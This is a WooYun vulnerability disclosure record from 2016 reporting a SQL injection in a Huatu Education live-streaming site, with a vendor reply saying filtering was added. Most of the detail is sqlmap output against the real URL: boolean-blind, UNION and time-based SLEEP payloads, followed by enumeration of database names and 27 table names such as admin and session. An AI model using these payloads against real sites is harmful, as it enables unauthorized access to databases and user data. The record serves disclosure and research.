{"id": 88426, "wybug_id": "wooyun-2016-0225440", "wybug_title": "华图教育某站伪静态SQL注入                                      ", "wybug_corp": "华图教育", "wybug_author": "路人甲", "wybug_date": "2016-07-04 10:33", "wybug_open_date": "2016-07-05 17:35", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-07-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-07-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-07-05：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： RT 详细说明：  \nhttp://wooyun.org/bugs/wooyun-2016-0222995\n接上大牛的继续   漏洞证明：  \n注入处：http://live.huatu.com/Search/index/fx/index\n\nPlace: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://live.huatu.com:80/Search/index/fx/index') AND 9438=9438 AND('XXvg'='XXvg    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: http://live.huatu.com:80/Search/index/fx/index') LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a64646a3a,0x6f6a6f57457a6b4a4142,0x3a796e783a), NULL, NULL--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://live.huatu.com:80/Search/index/fx/index') AND SLEEP(5) AND ('ayvC'='ayvC---[16:37:02] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[16:37:02] [WARNING] HTTP error codes detected during testing:404 (Not Found) - 1 times[16:37:02] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[16:37:02] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\xiaolu\\??\\SQLMAP~1\\SQLMAP~1\\Bin\\output\\live.huatu.com'\n\nPlace: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://live.huatu.com:80/Search/index/fx/index') AND 9438=9438 AND('XXvg'='XXvg    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: http://live.huatu.com:80/Search/index/fx/index') LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a64646a3a,0x6f6a6f57457a6b4a4142,0x3a796e783a), NULL, NULL--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://live.huatu.com:80/Search/index/fx/index') AND SLEEP(5) AND ('ayvC'='ayvC---[16:37:11] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[16:37:11] [INFO] fetching database names[16:37:11] [INFO] the SQL query used returns 3 entries[16:37:11] [INFO] retrieved: \"information_schema\"[16:37:12] [INFO] retrieved: \"live\"[16:37:12] [INFO] retrieved: \"test\"available databases [3]:[*] information_schema[*] live[*] test[16:37:13] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[16:37:13] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\xiaolu\\??\\SQLMAP~1\\SQLMAP~1\\Bin\\output\\live.huatu.com'\n\nPlace: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://live.huatu.com:80/Search/index/fx/index') AND 9438=9438 AND('XXvg'='XXvg    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: http://live.huatu.com:80/Search/index/fx/index') LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a64646a3a,0x6f6a6f57457a6b4a4142,0x3a796e783a), NULL, NULL--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://live.huatu.com:80/Search/index/fx/index') AND SLEEP(5) AND ('ayvC'='ayvC---[16:37:52] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[16:37:52] [INFO] fetching tables for database: 'live'[16:37:52] [INFO] the SQL query used returns 27 entries[16:37:52] [INFO] retrieved: \"admin\"[16:37:52] [INFO] retrieved: \"dede_addoncrm\"[16:37:53] [INFO] retrieved: \"dede_live_shengcheng\"[16:37:53] [INFO] retrieved: \"fenxiao\"[16:37:53] [INFO] retrieved: \"fufei\"[16:37:53] [INFO] retrieved: \"live_tongbu\"[16:37:53] [INFO] retrieved: \"livepl\"[16:37:53] [INFO] retrieved: \"new_teacher\"[16:37:54] [INFO] retrieved: \"new_tv\"[16:37:54] [INFO] retrieved: \"session\"[16:37:54] [INFO] retrieved: \"testbiao\"[16:37:54] [INFO] retrieved: \"tv_ads\"[16:37:54] [INFO] retrieved: \"tv_blacklist\"[16:37:54] [INFO] retrieved: \"tv_category\"[16:37:55] [INFO] retrieved: \"tv_dianzan\"[16:37:55] [INFO] retrieved: \"tv_flowers\"[16:37:55] [INFO] retrieved: \"tv_fufei\"[16:37:55] [INFO] retrieved: \"tv_jilu\"[16:37:55] [INFO] retrieved: \"tv_live_accept\"[16:37:56] [INFO] retrieved: \"tv_member\"[16:37:56] [INFO] retrieved: \"tv_sc\"[16:37:56] [INFO] retrieved: \"tv_yuyue\"[16:37:56] [INFO] retrieved: \"v1\"[16:37:56] [INFO] retrieved: \"wb_fenxiao\"[16:37:56] [INFO] retrieved: \"wb_tv\"[16:37:57] [INFO] retrieved: \"wb_tv_view\"[16:37:57] [INFO] retrieved: \"web_teacher\"Database: live[27 tables]+----------------------+| admin                || dede_addoncrm        || dede_live_shengcheng || fenxiao              || fufei                || live_tongbu          || livepl               || new_teacher          || new_tv               || session              || testbiao             || tv_ads               || tv_blacklist         || tv_category          || tv_dianzan           || tv_flowers           || tv_fufei             || tv_jilu              || tv_live_accept       || tv_member            || tv_sc                || tv_yuyue             || v1                   || wb_fenxiao           || wb_tv                || wb_tv_view           || web_teacher          |+----------------------+[16:37:57] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[16:37:57] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\xiaolu\\??\\SQLMAP~1\\SQLMAP~1\\Bin\\output\\live.huatu.com'\n   修复方案：  ~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2016-07-05 17:34 厂商回复： 已经添加过滤 最新状态： 2016-07-05：已经添加过滤  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}